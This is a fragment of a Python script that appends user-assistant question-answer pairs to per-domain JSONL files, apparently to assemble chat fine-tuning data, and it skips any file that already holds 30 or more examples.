data_dir = BASE / "data/upgrades"
total_written = 0

# Process upgrades with specific data
for up, domain_info in ALL_DOMAINS.items():
    if isinstance(domain_info, dict):
        domain_name = domain_info["name"]
        pairs = domain_info["pairs"]
    else:
        domain_name, pairs = domain_info

    jsonl = data_dir / f"upgrade_{up}.jsonl"
    existing = 0
    if jsonl.exists():
        existing = sum(1 for _ in open(jsonl))

    # Only add if we have fewer than 30 examples
    if existing >= 30:
        print(f"  upgrade_{up}: {existing} examples already — skipping")
        continue

    written = 0
    with open(jsonl, "a") as f:
        for q, a in pairs:
            f.write(json.dumps({"messages": [
                {"role": "user", "content": q},
                {"role": "assistant", "content": a}
            ]}, ensure_ascii=False) + "\n")
            written += 1
    total_written += written
    print(f"  upgrade_{up} ({domain_name}): added {written} examples (total: {existing + written})")

# Process generic domains
